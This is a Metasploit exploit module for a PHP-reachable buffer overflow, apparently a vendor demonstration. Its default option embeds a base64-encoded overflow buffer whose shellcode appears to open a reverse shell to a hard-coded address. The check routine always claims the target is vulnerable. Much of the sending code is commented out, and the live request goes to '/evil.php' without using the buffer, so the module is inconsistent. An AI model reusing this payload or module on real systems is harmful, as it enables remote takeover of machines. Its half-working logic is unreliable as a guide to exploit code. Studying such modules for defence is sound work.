##
# This module requires Metasploit
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Polyverse c-exploit example',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow via PHP 
      |,
      'Author'         => 'Polyverse',
      'References'     =>
        [
          [ 'URL', 'https://polyverse.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'          => [ARCH_X86],
      'Targets'        => 
        [
          [
            'Linux x86',
            {
              'Arch' => ARCH_X86,
              'Ret'      => 0xffffd7a0
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
    
    register_options(
      [
        #OptString.new('PAYLOAD64', [true, 'Base64-encoded payload with = at the end.', 'QUFBQUFBQUFBQUFBQUFBQUFjCkAAAAAAAOhDuff/fwAAkCSn9/9/AAAK='])
        OptString.new('PAYLOAD64', [true, 'Base64-encoded payload with = at the end.', 'YWFhYWFhYWFhYWFhYWFhYWEw5v%2F%2F%2F38AAEgxwEgx%2F0gx9kgx0k0xwGoCX2oBXmoGWmopWA8FSYnASDH2TTHSQVLGBCQCZsdEJAIVs8dEJASsEAEfSInmahBaQVBfaipYDwVIMfZqA15I%2F85qIVgPBXX2SDH%2FV1deWki%2FLy9iaW4vc2hIwe8IV1RfajtYDwViYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiAA%3D%3D"'])
      ])
  end


  # Returns that the remote host is always vulnerable
  def check
    print_status("def check...")
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("start exploit...")
    print_status(datastore['PAYLOAD64'])

    buf = "A" * 17
    buf += datastore['PAYLOAD64']
    #buf = "chris"
    #buf += payload.encoded

    #res = send_request_raw({
    #  'uri'       => normalize_uri(target_uri.path,"index.php"),
    #  'method'    => 'GET',
    #  'vars_get' => {
    #  'q' => buf
    #  }
    #})
    #res = send_request_raw({'uri'=>'/index.php?q=' + datastore['PAYLOAD64']})
    res = send_request_raw({'uri'=>'/evil.php'})
    print_status("done exploit.... #{res}")

    #print_status("Sending #{payload.encoded.length} byte payload... #{@res}")

    # Build the buffer for transmission
    #buf = "A" * 1044
    #buf += [ target.ret ].pack('V')
    #buf += payload.encoded

    # Send it off
    #sock.put(buf)
    #sock.get

    #handler
  end
end
